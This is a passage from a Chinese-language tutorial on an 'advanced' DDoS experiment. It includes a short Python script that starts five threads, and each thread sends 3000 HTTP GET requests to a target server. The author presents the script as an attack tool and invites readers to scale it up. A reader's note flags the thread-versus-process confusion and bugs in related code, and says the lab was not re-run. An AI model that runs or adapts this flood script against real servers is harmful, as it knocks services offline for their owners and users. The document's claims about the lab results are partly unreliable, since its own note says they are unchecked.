DDoS进阶把控制器扩展到两虚拟机，再用五线程请求发生程序说明分布式与并发。

阅读说明：程序用threading不是多进程；正常促销流量是拥挤不是自动等同攻击，checkIN返回列表取布尔导致下载判断错误、Hosts未用及退出序号赋值错误。 原实验环境和代码未重新运行，涉及截图的关键细节仍待核对。

先观察单节点请求程序，再讨论线程并发。

以下为线程版本示例；代码逻辑和实验结果仍需在隔离环境中验证。

这里给出的代码 是DoS发生器的进阶段版本 能一下子启动5个进程 每个进程攻击3000次目标!

当然你想启动8个10个进程 攻击100次 1000次 都随意

> 这仅仅是思路 远远达不到实战效果

```
import http.client
import time
import threading

class Dos(object):
    def __init__(self):
        pass

    def DDoS(self,funcs,sleepTimes,servAddrs,urls):
        threads = []
        loops = range(len(funcs))
        for i in loops:
            t = threading.Thread(target=funcs[i],args=(sleepTimes[i],servAddrs[i],urls[i]))
            threads.append(t)
        for i in loops:
            threads[i].start()

    def httpGetFlood(self,sleepTime,servAddr,url):
        for i in range(3000):
            print('第',i+1,'次攻击')
            time.sleep(sleepTime)
            try:
                conn = http.client.HTTPConnection(servAddr)
                conn.request('GET',url)
                r1 = conn.getresponse()
                print(r1.status,r1.reason)
                conn.close()
            except IOError as e:
                print("except:",e)
            finally:
                pass
        print("httpGetDoS END")
```
